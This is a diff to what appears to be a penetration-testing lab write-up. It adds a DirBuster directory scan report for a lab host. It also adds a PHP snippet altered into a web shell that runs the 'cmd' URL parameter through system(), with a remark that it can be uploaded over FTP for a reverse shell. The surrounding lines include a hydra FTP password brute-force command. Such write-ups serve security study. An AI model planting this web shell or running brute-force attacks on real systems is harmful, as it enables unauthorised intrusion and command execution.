@@ -133,6 +133,28 @@ lo        Link encap:Local Loopback
 
 {% tab title="Report" %}
 ```bash
+DirBuster 1.0-RC1 - Report
+http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project
+Report produced on Sun Jul 18 15:18:12 EDT 2021
+--------------------------------
+
+http://172.16.37.234:40180
+--------------------------------
+Directories found during testing:
+
+Dirs found with a 200 response:
+
+/
+/xyz/
+
+Dirs found with a 403 response:
+
+/icons/
+/icons/small/
+
+
+--------------------------------
+--------------------------------
 
 ```
 {% endtab %}
@@ -198,4 +220,33 @@ hydra -t 30 -l ftpuser -P /usr/share/seclists/Passwords/bt4-password.txt ftp://1
 ```
 {% endtab %}
 {% endtabs %}
+
+{% hint style="info" %}
+Under /html/xyz there's an index.php file
+
+```php
+<?php
+
+echo "<!-- cmd: " . $_GET["cmd"] . "-->";
+echo "<hr />";
+
+system("ifconfig");
+
+?>
+```
+
+We can modify this script to create a reverse shell via URL, and upload via FTP to access it from /xyz/my-cmd.php:
+
+```php
+<?php
+
+echo "<!-- cmd: " . $_GET["cmd"] . "-->";
+echo "<hr />";
+
+system($_GET["cmd"]);
+
+?>
+
+```
+{% endhint %}
 
